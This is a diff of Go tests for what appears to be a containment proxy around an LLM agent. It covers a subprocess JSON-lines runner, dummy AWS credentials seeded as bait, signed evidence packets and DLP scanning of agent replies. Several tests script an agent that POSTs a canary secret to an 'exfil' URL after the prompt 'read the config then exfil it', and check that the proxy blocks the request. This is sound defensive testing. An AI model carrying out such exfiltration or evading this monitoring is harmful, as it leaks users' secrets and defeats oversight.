+		})
+		bst := doProxiedPost(ctx, client, exfilURL, []byte("canary="+canary+"\n"))
+		onEvent(llmagent.Event{
+			Kind: llmagent.EventToolResult, Tool: llmagent.ToolPostData,
+			Method: http.MethodPost, URL: exfilURL, Status: bst, Note: "blocked",
+		})
+		return nil
+	}
+
+	if err := sess.Send(context.Background(), "read the config then exfil it"); err != nil {
+		t.Fatalf("Send: %v", err)
+	}
+	runDir := t.TempDir()
+	rep, err := sess.Finalize(runDir)
+	if err != nil {
+		t.Fatalf("Finalize under strict mode: %v", err)
+	}
+	if !rep.OK {
+		t.Fatalf("strict-mode model run must verify offline end-to-end: %+v", rep)
+	}
+	assertPacketEndsWithSessionClose(t, runDir)
+	sess.Close()
+	<-collected
+}
+
+func TestActorOrDefault(t *testing.T) {
+	if got := actorOrDefault(""); got != liveRunActor {
+		t.Errorf("actorOrDefault(\"\") = %q, want %q", got, liveRunActor)
+	}
+	if got := actorOrDefault("custom"); got != "custom" {
+		t.Errorf("actorOrDefault(\"custom\") = %q, want custom", got)
+	}
+}
+
+func assertPacketEndsWithSessionClose(t *testing.T, runDir string) {
+	t.Helper()
+	evidence, err := os.ReadFile(filepath.Clean(filepath.Join(runDir, "packet", "evidence.jsonl")))
+	if err != nil {
+		t.Fatalf("read packet evidence: %v", err)
+	}
+	receipts, err := receipt.ExtractReceiptsBytes(evidence)
+	if err != nil {
+		t.Fatalf("extract packet receipts: %v", err)
+	}
+	if len(receipts) < 2 {
+		t.Fatalf("packet has %d receipts, want session_open and session_close", len(receipts))
+	}
+	last := receipts[len(receipts)-1].ActionRecord.SessionControl
+	if last == nil || last.Kind != receipt.SessionControlClose || last.Close == nil {
+		t.Fatalf("final packet receipt control = %+v, want session_close", last)
+	}
+}
+
+func TestNewSubprocessTurnRunner_Validation(t *testing.T) {
+	if _, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{}); err == nil {
+		t.Error("empty bin should error")
+	}
+	if _, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{Bin: "/bin/true"}); err == nil {
+		t.Error("missing proxy url should fail closed")
+	}
+	// A non-existent binary fails closed at Start.
+	if _, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
+		Bin: filepath.Join(t.TempDir(), "does-not-exist"), ProxyURL: "http://127.0.0.1:1/",
+		ModelBaseURL: "http://m/v1", Model: "x", SecretFile: "k",
+	}); err == nil {
+		t.Error("non-existent binary should fail at start")
+	}
+}
+
+// echoHelperSrc emits one reply and a turn_done per input line.
+const echoHelperSrc = `package main
+import ("bufio";"fmt";"os")
+func main() {
+	sc := bufio.NewScanner(os.Stdin)
+	sc.Buffer(make([]byte, 0, 4096), 1<<20)
+	for sc.Scan() {
+		fmt.Println(` + "`" + `{"kind":"reply","text":"ok"}` + "`" + `)
+		fmt.Println(` + "`" + `{"kind":"turn_done"}` + "`" + `)
+	}
+}
+`
+
+// TestSubprocessTurnRunner_ContextCancelled: a cancelled context aborts the turn
+// after the next event is read.
+func TestSubprocessTurnRunner_ContextCancelled(t *testing.T) {
+	if testing.Short() {
+		t.Skip("builds + spawns a helper subprocess")
+	}
+	dir := t.TempDir()
+	bin := buildLLMHelper(t, echoHelperSrc)
+	runner, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
+		Bin: bin, ProxyURL: "http://proxy.invalid/",
+		ModelBaseURL: "http://m/v1", Model: "x", SecretFile: filepath.Join(dir, "k"),
+	})
+	if err != nil {
+		t.Fatalf("newSubprocessTurnRunner: %v", err)
+	}
+	defer func() { _ = runner.Close() }()
+
+	ctx, cancel := context.WithCancel(t.Context())
+	cancel() // cancel before the turn: the loop returns ctx.Err() after first read
+	if err := runner.RunTurn(ctx, "hello", func(llmagent.Event) {}); !errors.Is(err, context.Canceled) {
+		t.Fatalf("RunTurn err = %v, want context.Canceled", err)
+	}
+}
+
+func TestSubprocessTurnRunner_ModelProviderPausedConsumesTurnDone(t *testing.T) {
+	if testing.Short() {
+		t.Skip("builds + spawns a helper subprocess")
+	}
+	dir := t.TempDir()
+	src := `package main
+import ("bufio";"fmt";"os")
+func main() {
+	sc := bufio.NewScanner(os.Stdin)
+	first := true
+	for sc.Scan() {
+		if first {
+			first = false
+			fmt.Println(` + "`" + `{"kind":"error","text":"model returned 429: provider raw detail","code":"model_provider_paused"}` + "`" + `)
+			fmt.Println(` + "`" + `{"kind":"turn_done"}` + "`" + `)
+			continue
+		}
+		fmt.Println(` + "`" + `{"kind":"reply","text":"ok"}` + "`" + `)
+		fmt.Println(` + "`" + `{"kind":"turn_done"}` + "`" + `)
+	}
+}
+`
+	bin := buildLLMHelper(t, src)
+	runner, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
+		Bin: bin, ProxyURL: "http://proxy.invalid/",
+		ModelBaseURL: "http://m/v1", Model: "x", SecretFile: filepath.Join(dir, "k"),
+	})
+	if err != nil {
+		t.Fatalf("newSubprocessTurnRunner: %v", err)
+	}
+	defer func() { _ = runner.Close() }()
+
+	var first []llmagent.Event
+	err = runner.RunTurn(t.Context(), "hello", func(ev llmagent.Event) {
+		first = append(first, ev)
+	})
+	if !errors.Is(err, ErrModelProviderPaused) {
+		t.Fatalf("RunTurn first err = %v, want ErrModelProviderPaused", err)
+	}
+	if len(first) != 1 || first[0].Kind != llmagent.EventError || first[0].Code != llmagent.ErrorCodeModelProviderPaused {
+		t.Fatalf("first events = %+v, want provider-paused error event", first)
+	}
+
+	var second []llmagent.Event
+	if err := runner.RunTurn(t.Context(), "again", func(ev llmagent.Event) {
+		second = append(second, ev)
+	}); err != nil {
+		t.Fatalf("RunTurn second: %v", err)
+	}
+	if len(second) != 1 || second[0].Kind != llmagent.EventReply {
+		t.Fatalf("second events = %+v, want reply after turn_done was consumed", second)
+	}
+}
+
+func TestSubprocessTurnRunner_ContextCancelledWhileWaitingForOutput(t *testing.T) {
+	if testing.Short() {
+		t.Skip("builds + spawns a helper subprocess")
+	}
+	dir := t.TempDir()
+	src := `package main
+import ("bufio";"os")
+func main() {
+	sc := bufio.NewScanner(os.Stdin)
+	if sc.Scan() {
+		buf := make([]byte, 1)
+		_, _ = os.Stdin.Read(buf)
+	}
+}
+`
+	bin := buildLLMHelper(t, src)
+	runner, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
+		Bin: bin, ProxyURL: "http://127.0.0.1:1/",
+		ModelBaseURL: "http://m/v1", Model: "x", SecretFile: filepath.Join(dir, "k"),
+	})
+	if err != nil {
+		t.Fatalf("newSubprocessTurnRunner: %v", err)
+	}
+	defer func() { _ = runner.Close() }()
+
+	ctx, cancel := context.WithTimeout(t.Context(), 50*time.Millisecond)
+	defer cancel()
+	err = runner.RunTurn(ctx, "hello", func(llmagent.Event) {})
+	if !errors.Is(err, context.DeadlineExceeded) {
+		t.Fatalf("RunTurn err = %v, want context deadline", err)
+	}
+}
+
+// TestSubprocessTurnRunner_ReadError: an over-long stdout line (no newline within
+// the buffer cap) is a scanner read error that fails the turn.
+func TestSubprocessTurnRunner_ReadError(t *testing.T) {
+	if testing.Short() {
+		t.Skip("builds + spawns a helper subprocess")
+	}
+	dir := t.TempDir()
+	// Reads the message, then writes >1 MiB with no newline => bufio.ErrTooLong.
+	src := `package main
+import ("bufio";"os";"strings")
+func main() {
+	sc := bufio.NewScanner(os.Stdin)
+	if sc.Scan() {
+		_, _ = os.Stdout.WriteString(strings.Repeat("x", 2<<20))
+	}
+}
+`
+	bin := buildLLMHelper(t, src)
+	runner, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
+		Bin: bin, ProxyURL: "http://127.0.0.1:1/",
+		ModelBaseURL: "http://m/v1", Model: "x", SecretFile: filepath.Join(dir, "k"),
+	})
+	if err != nil {
+		t.Fatalf("newSubprocessTurnRunner: %v", err)
+	}
+	defer func() { _ = runner.Close() }()
+	if err := runner.RunTurn(t.Context(), "hello", func(llmagent.Event) {}); err == nil {
+		t.Fatal("RunTurn should fail on a scanner read error")
+	}
+}
+
+// TestSubprocessTurnRunner_MalformedLine: a non-JSON stdout line fails the turn.
+func TestSubprocessTurnRunner_MalformedLine(t *testing.T) {
+	if testing.Short() {
+		t.Skip("builds + spawns a helper subprocess")
+	}
+	dir := t.TempDir()
+	src := `package main
+import ("bufio";"fmt";"os")
+func main() {
+	sc := bufio.NewScanner(os.Stdin)
+	if sc.Scan() {
+		fmt.Println("not json at all")
+	}
+}
+`
+	bin := buildLLMHelper(t, src)
+	runner, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
+		Bin: bin, ProxyURL: "http://127.0.0.1:1/",
+		ModelBaseURL: "http://m/v1", Model: "x", SecretFile: filepath.Join(dir, "k"),
+	})
+	if err != nil {
+		t.Fatalf("newSubprocessTurnRunner: %v", err)
+	}
+	defer func() { _ = runner.Close() }()
+	if err := runner.RunTurn(t.Context(), "hello", func(llmagent.Event) {}); err == nil {
+		t.Fatal("RunTurn should fail on a malformed event line")
+	}
+}
+
+// buildLLMHelper compiles a tiny Go program implementing the agent wrapper's
+// stdin/stdout JSON-lines protocol, returning the binary path. Using go build
+// (not a chmod'd script) avoids an executable-bit perms lint issue and keeps the
+// helper cross-platform.
+func buildLLMHelper(t *testing.T, src string) string {
+	t.Helper()
+	dir := t.TempDir()
+	srcPath := filepath.Join(dir, "main.go")
+	if err := os.WriteFile(srcPath, []byte(src), 0o600); err != nil {
+		t.Fatalf("write helper source: %v", err)
+	}
+	binPath := filepath.Join(dir, "helper")
+	cmd := exec.CommandContext(t.Context(), "go", "build", "-o", binPath, srcPath)
+	cmd.Env = os.Environ()
+	if out, err := cmd.CombinedOutput(); err != nil {
+		t.Fatalf("build helper: %v\n%s", err, out)
+	}
+	return binPath
+}
+
+// TestSubprocessTurnRunner_Protocol drives the runner against a compiled helper
+// implementing the stdin/stdout JSON-lines protocol, covering spawn, RunTurn, the
+// env/arg wiring, and Close without a real model or proxy.
+func TestSubprocessTurnRunner_Protocol(t *testing.T) {
+	if testing.Short() {
+		t.Skip("builds + spawns a helper subprocess")
+	}
+	dir := t.TempDir()
+	scratch := t.TempDir()
+	argsOut := filepath.Join(dir, "args.txt")
+	deadKey := "AKIA" + "EXAMPLEDEADKEY00"
+	deadSecretAccessKey := "deadsecret" + strings.Repeat("0", 28) + "AB"
+	// Records argv + the dead-secret env + HOME on first read, then emits one reply
+	// and a turn_done per input line.
+	src := fmt.Sprintf(`package main
+import ("bufio";"fmt";"os";"strings")
+func main() {
+	recorded := false
+	sc := bufio.NewScanner(os.Stdin)
+	sc.Buffer(make([]byte, 0, 4096), 1<<20)
+	for sc.Scan() {
+		if !recorded {
+			_ = os.WriteFile(%q, []byte("ARGS:"+strings.Join(os.Args[1:], " ")+"\nAWSID:"+os.Getenv("AWS_ACCESS_KEY_ID")+"\nHOME:"+os.Getenv("HOME")+"\nSECRETENV:"+os.Getenv("PIPELOCK_PLAYGROUND_SECRET_ENV")+"\n"), 0o600)
+			recorded = true
+		}
+		fmt.Println(`+"`"+`{"kind":"reply","text":"hi from helper"}`+"`"+`)
+		fmt.Println(`+"`"+`{"kind":"turn_done"}`+"`"+`)
+	}
+}
+`, argsOut)
+	bin := buildLLMHelper(t, src)
+
+	runner, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
+		Bin:                bin,
+		ProxyURL:           "http://127.0.0.1:1/",
+		ModelBaseURL:       "http://model.api.test/v1",
+		Model:              "test-model",
+		SecretFile:         filepath.Join(dir, "key"),
+		ScratchDir:         scratch,
+		AllowExec:          true,
+		AWSAccessKeyID:     deadKey,
+		AWSSecretAccessKey: deadSecretAccessKey,
+		MaxSteps:           4,
+		Timeout:            2 * time.Second,
+	})
+	if err != nil {
+		t.Fatalf("newSubprocessTurnRunner: %v", err)
+	}
+
+	var got []llmagent.Event
+	if err := runner.RunTurn(t.Context(), "hello", func(ev llmagent.Event) {
+		got = append(got, ev)
+	}); err != nil {
+		t.Fatalf("RunTurn: %v", err)
+	}
+	if len(got) != 1 || got[0].Kind != llmagent.EventReply || got[0].Text != "hi from helper" {
+		t.Fatalf("events = %+v, want one reply 'hi from helper'", got)
+	}
+
+	recorded, err := os.ReadFile(filepath.Clean(argsOut))
+	if err != nil {
+		t.Fatalf("read args: %v", err)
+	}
+	rec := string(recorded)
+	for _, want := range []string{"--proxy-url", "--model-base-url", "--scratch-dir", "--allow-exec"} {
+		if !strings.Contains(rec, want) {
+			t.Errorf("argv missing %q: %q", want, rec)
+		}
+	}
+	if !strings.Contains(rec, "AWSID:"+deadKey) {
+		t.Errorf("dead AWS key env not passed: %q", rec)
+	}
+	if !strings.Contains(rec, "HOME:"+scratch) {
+		t.Errorf("HOME not set to scratch: %q", rec)
+	}
+	if !strings.Contains(rec, "SECRETENV:AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY") {
+		t.Errorf("secret-env hint not passed: %q", rec)
+	}
+	// The credentials file is seeded under the scratch HOME with the dead values.
+	creds, err := os.ReadFile(filepath.Clean(filepath.Join(scratch, ".aws", "credentials")))
+	if err != nil {
+		t.Fatalf("read seeded credentials: %v", err)
+	}
+	if !strings.Contains(string(creds), deadKey) || !strings.Contains(string(creds), deadSecretAccessKey) {
+		t.Errorf("seeded credentials missing dead values: %q", string(creds))
+	}
+
+	if err := runner.Close(); err != nil {
+		t.Errorf("Close: %v", err)
+	}
+	if err := runner.Close(); err != nil {
+		t.Errorf("second Close: %v", err)
+	}
+	// RunTurn after Close fails closed.
+	if err := runner.RunTurn(t.Context(), "again", func(llmagent.Event) {}); err == nil {
+		t.Error("RunTurn after Close should error")
+	}
+}
+
+// TestSubprocessTurnRunner_NoTurnDone: stdout closing before a turn_done marker
+// fails the turn closed.
+func TestSubprocessTurnRunner_NoTurnDone(t *testing.T) {
+	if testing.Short() {
+		t.Skip("builds + spawns a helper subprocess")
+	}
+	dir := t.TempDir()
+	// Emits a reply then exits WITHOUT turn_done.
+	src := `package main
+import ("bufio";"fmt";"os")
+func main() {
+	sc := bufio.NewScanner(os.Stdin)
+	if sc.Scan() {
+		fmt.Println(` + "`" + `{"kind":"reply","text":"partial"}` + "`" + `)
+	}
+}
+`
+	bin := buildLLMHelper(t, src)
+	runner, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
+		Bin: bin, ProxyURL: "http://127.0.0.1:1/",
+		ModelBaseURL: "http://m/v1", Model: "x", SecretFile: filepath.Join(dir, "k"),
+	})
+	if err != nil {
+		t.Fatalf("newSubprocessTurnRunner: %v", err)
+	}
+	defer func() { _ = runner.Close() }()
+
+	if err := runner.RunTurn(t.Context(), "hello", func(llmagent.Event) {}); err == nil {
+		t.Fatal("RunTurn should fail when the turn never completes")
+	}
+}
+
+func TestSubprocessTurnRunner_CloseCancelsStuckChild(t *testing.T) {
+	if testing.Short() {
+		t.Skip("builds + spawns a helper subprocess")
+	}
+	dir := t.TempDir()
+	src := `package main
+import "net"
+func main() {
+	ln, err := net.Listen("tcp", "127.0.0.1:0")
+	if err != nil {
+		return
+	}
+	defer func() { _ = ln.Close() }()
+	_, _ = ln.Accept()
+}
+`
+	bin := buildLLMHelper(t, src)
+	runner, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
+		Bin: bin, ProxyURL: "http://127.0.0.1:1/",
+		ModelBaseURL: "http://m/v1", Model: "x", SecretFile: filepath.Join(dir, "k"),
+	})
+	if err != nil {
+		t.Fatalf("newSubprocessTurnRunner: %v", err)
+	}
+
+	done := make(chan error, 1)
+	go func() { done <- runner.Close() }()
+	select {
+	case err := <-done:
+		if err != nil {
+			t.Fatalf("Close: %v", err)
+		}
+	case <-time.After(testwait.Deadline(time.Second)):
+		t.Fatal("Close did not cancel and reap the stuck subprocess")
+	}
+}
+
+// TestStartLiveSession_LLMScratchLifecycleAndNoExecUncontained drives a real dev
+// (uncontained) model-backed session and checks: a per-session scratch dir is
+// created and seeded with the dead AWS credentials, run_command is NOT enabled
+// uncontained (no --allow-exec), and Close wipes the scratch dir.
+func TestStartLiveSession_LLMScratchLifecycleAndNoExecUncontained(t *testing.T) {
+	if testing.Short() {
+		t.Skip("builds + spawns a helper subprocess")
+	}
+	dir := t.TempDir()
+	argsOut := filepath.Join(dir, "argv.txt")
+	src := fmt.Sprintf(`package main
+import ("bufio";"fmt";"os";"strings")
+func main() {
+	_ = os.WriteFile(%q, []byte(strings.Join(os.Args[1:], " ")), 0o600)
+	sc := bufio.NewScanner(os.Stdin)
+	for sc.Scan() {
+		fmt.Println(`+"`"+`{"kind":"reply","text":"ok"}`+"`"+`)
+		fmt.Println(`+"`"+`{"kind":"turn_done"}`+"`"+`)
+	}
+}
+`, argsOut)
+	bin := buildLLMHelper(t, src)
+	keyFile := filepath.Join(dir, "model.key")
+	if err := os.WriteFile(keyFile, []byte("dummy-key"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	sess, err := StartLiveSession(t.Context(), LiveSessionConfig{
+		RunNonce:           "scratch-test",
+		RequireContainment: false, // dev => AllowExec must be false (no shell)
+		LLMAgent: &LLMAgentConfig{
+			Bin:          bin,
+			ModelBaseURL: "http://model.api.test/v1",
+			Model:        "x",
+			SecretFile:   keyFile,
+		},
+	})
+	if err != nil {
+		t.Fatalf("StartLiveSession: %v", err)
+	}
+	// Drain events so the session never blocks pushing the status event.
+	go func() {
+		for range sess.Events() {
+		}
+	}()
+
+	scratch := sess.scratchDir
+	if scratch == "" {
+		t.Fatal("session did not create a scratch dir")
+	}
+	if _, err := os.Stat(filepath.Join(scratch, ".aws", "credentials")); err != nil {
+		t.Fatalf("seeded credentials missing in scratch: %v", err)
+	}
+
+	// Drive one turn so the helper records its argv (synchronizes on turn_done).
+	if err := sess.Send(t.Context(), "hello"); err != nil {
+		t.Fatalf("Send: %v", err)
+	}
+	argv, err := os.ReadFile(filepath.Clean(argsOut))
+	if err != nil {
+		t.Fatalf("read argv: %v", err)
+	}
+	if strings.Contains(string(argv), "--allow-exec") {
+		t.Errorf("uncontained session must NOT enable run_command; argv=%q", argv)
+	}
+	if !strings.Contains(string(argv), "--scratch-dir") {
+		t.Errorf("argv missing --scratch-dir: %q", argv)
+	}
+
+	sess.Close()
+	if _, err := os.Stat(scratch); !os.IsNotExist(err) {
+		t.Fatalf("scratch dir not wiped on Close: err=%v", err)
+	}
+}
+
+// --- small request helpers ---
+
+func doProxiedGet(ctx context.Context, client *http.Client, rawURL string) int {
+	return doProxiedRequest(ctx, client, http.MethodGet, rawURL, nil, nil)
+}
+
+func doProxiedPost(ctx context.Context, client *http.Client, rawURL string, body []byte) int {
+	return doProxiedRequest(ctx, client, http.MethodPost, rawURL, body, map[string]string{
+		"Content-Type": "application/x-www-form-urlencoded",
+	})
+}
+
+func doProxiedRequest(ctx context.Context, client *http.Client, method, rawURL string, body []byte, headers map[string]string) int {
+	var rdr io.Reader
+	if body != nil {
+		rdr = bytes.NewReader(body)
+	}
+	req, err := http.NewRequestWithContext(ctx, method, rawURL, rdr)
+	if err != nil {
+		return 0
+	}
+	req.Header.Set(proxy.AgentHeader, liveRunActor)
+	for k, v := range headers {
+		req.Header.Set(k, v)
+	}
+	resp, err := client.Do(req)
+	if err != nil {
+		return 0
+	}
+	_, _ = io.Copy(io.Discard, resp.Body)
+	_ = resp.Body.Close()
+	return resp.StatusCode
+}
+
+func portFromURL(raw string) (string, error) {
+	u, err := url.Parse(raw)
+	if err != nil {
+		return "", err
+	}
+	return u.Port(), nil
+}
+
+// TestLiveSession_Finalize_TransfersRunnerProviderModel drives the REAL
+// handoff Finalize performs, rather than injecting a provider model directly
+// with SetProviderModel: a scriptedRunner reports a provider model through
+// ProviderModel() the way subprocessTurnRunner does after observing
+// llmagent.EventProviderModel, and Finalize must read it and pass it to
+// SetProviderModel before sealing. This proves the transfer wiring itself,
+// not just that SetProviderModel/AssembleAndVerify sign whatever they are
+// handed.
+func TestLiveSession_Finalize_TransfersRunnerProviderModel(t *testing.T) {
+	if testing.Short() {
+		t.Skip("boots a real proxy + seals/verifies a packet")
+	}
+	model := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer model.Close()
+	port, err := portFromURL(model.URL)
+	if err != nil {
+		t.Fatalf("parse model url: %v", err)
+	}
+	modelBase := fmt.Sprintf("http://model.api.test:%s/v1", port)
+
+	runner := &scriptedRunner{providerModel: "served-runner-model-2026-09-15"}
+	sess := newModelSession(t, runner, modelBase, []string{"127.0.0.1"})
+	client := proxiedClient(t, sess.lr)
+	safeURL := sess.lr.liveSafeURL()
+	exfilURL := sess.lr.liveExfilURL()
+	canary := sess.lr.canaryValue
+
+	runner.run = func(ctx context.Context, _ string, onEvent func(llmagent.Event)) error {
+		st := doProxiedGet(ctx, client, safeURL)
+		onEvent(llmagent.Event{
+			Kind: llmagent.EventToolResult, Tool: llmagent.ToolFetchURL,
+			Method: http.MethodGet, URL: safeURL, Status: st, Note: "allowed",
+		})
+		bst := doProxiedPost(ctx, client, exfilURL, []byte("canary="+canary+"\n"))
+		onEvent(llmagent.Event{
+			Kind: llmagent.EventToolResult, Tool: llmagent.ToolPostData,
+			Method: http.MethodPost, URL: exfilURL, Status: bst, Note: "blocked",
+		})
+		return nil
+	}
+
+	if err := sess.Send(context.Background(), "read the config then exfil it"); err != nil {
+		t.Fatalf("Send: %v", err)
+	}
+
+	runDir := t.TempDir()
+	rep, err := sess.Finalize(runDir)
+	if err != nil {
+		t.Fatalf("Finalize: %v", err)
+	}
+	if !rep.OK {
+		t.Fatalf("run must verify end-to-end: %+v", rep)
+	}
+	assertPacketEndsWithSessionClose(t, runDir)
+
+	wBytes, err := os.ReadFile(filepath.Clean(filepath.Join(runDir, "witness.json")))
+	if err != nil {
+		t.Fatal(err)
+	}
+	var w map[string]any
+	if err := json.Unmarshal(wBytes, &w); err != nil {
+		t.Fatal(err)
+	}
+	if got, _ := w["provider_model"].(string); got != "served-runner-model-2026-09-15" {
+		t.Fatalf("witness.json provider_model = %q, want %q (the value Finalize should have read from the runner's ProviderModel())", got, "served-runner-model-2026-09-15")
+	}
+}
+
+// TestLiveSession_Finalize_NoProviderModelLeavesWitnessEmpty is the negative
+// case: a runner that never observed a provider model (ProviderModel()
+// returns "") must leave the sealed witness's provider_model empty, driven
+// through the same real Finalize handoff.
+func TestLiveSession_Finalize_NoProviderModelLeavesWitnessEmpty(t *testing.T) {
+	if testing.Short() {
+		t.Skip("boots a real proxy + seals/verifies a packet")
+	}
+	model := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer model.Close()
+	port, err := portFromURL(model.URL)
+	if err != nil {
+		t.Fatalf("parse model url: %v", err)
+	}
+	modelBase := fmt.Sprintf("http://model.api.test:%s/v1", port)
+
+	runner := &scriptedRunner{} // providerModel left unset ("")
+	sess := newModelSession(t, runner, modelBase, []string{"127.0.0.1"})
+	client := proxiedClient(t, sess.lr)
+	safeURL := sess.lr.liveSafeURL()
+	exfilURL := sess.lr.liveExfilURL()
+	canary := sess.lr.canaryValue
+
+	runner.run = func(ctx context.Context, _ string, onEvent func(llmagent.Event)) error {
+		st := doProxiedGet(ctx, client, safeURL)
+		onEvent(llmagent.Event{
+			Kind: llmagent.EventToolResult, Tool: llmagent.ToolFetchURL,
+			Method: http.MethodGet, URL: safeURL, Status: st, Note: "allowed",
+		})
+		bst := doProxiedPost(ctx, client, exfilURL, []byte("canary="+canary+"\n"))
+		onEvent(llmagent.Event{
+			Kind: llmagent.EventToolResult, Tool: llmagent.ToolPostData,
+			Method: http.MethodPost, URL: exfilURL, Status: bst, Note: "blocked",
+		})
+		return nil
+	}
+
+	if err := sess.Send(context.Background(), "read the config then exfil it"); err != nil {
+		t.Fatalf("Send: %v", err)
+	}
+
+	runDir := t.TempDir()
+	rep, err := sess.Finalize(runDir)
+	if err != nil {
+		t.Fatalf("Finalize: %v", err)
+	}
+	if !rep.OK {
+		t.Fatalf("run must verify end-to-end: %+v", rep)
+	}
+	assertPacketEndsWithSessionClose(t, runDir)
+
+	wBytes, err := os.ReadFile(filepath.Clean(filepath.Join(runDir, "witness.json")))
+	if err != nil {
+		t.Fatal(err)
+	}
+	var w map[string]any
+	if err := json.Unmarshal(wBytes, &w); err != nil {
+		t.Fatal(err)
+	}
+	if got, _ := w["provider_model"].(string); got != "" {
+		t.Fatalf("witness.json provider_model = %q, want empty when the runner never observed a provider model", got)
+	}
+}
+
+func TestScanAgentReplyIncompleteDLPIsError(t *testing.T) {
+	sc := scanner.MustNew(config.Defaults())
+	defer sc.Close()
+	s := &LiveSession{lr: &LiveRun{sc: sc}}
+	ctx, cancel := context.WithCancel(t.Context())
+	cancel()
+	capture, err := os.CreateTemp(t.TempDir(), "stderr")
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer func() { _ = capture.Close() }()
+	previous := os.Stderr
+	os.Stderr = capture
+	defer func() { os.Stderr = previous }()
+	ev, blocked := s.scanAgentReply(ctx, LiveEvent{Text: "ordinary reply"})
+	if !blocked || ev.Text != redactedReplyNotice {
+		t.Fatalf("incomplete reply leaked: blocked=%v event=%+v", blocked, ev)
+	}
+	if _, err := capture.Seek(0, io.SeekStart); err != nil {
+		t.Fatal(err)
+	}
+	logged, err := io.ReadAll(capture)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(string(logged), "scan error") || strings.Contains(string(logged), "trigger=generic-dlp") {
+		t.Fatalf("incomplete reply misattributed: %s", logged)
+	}
+}
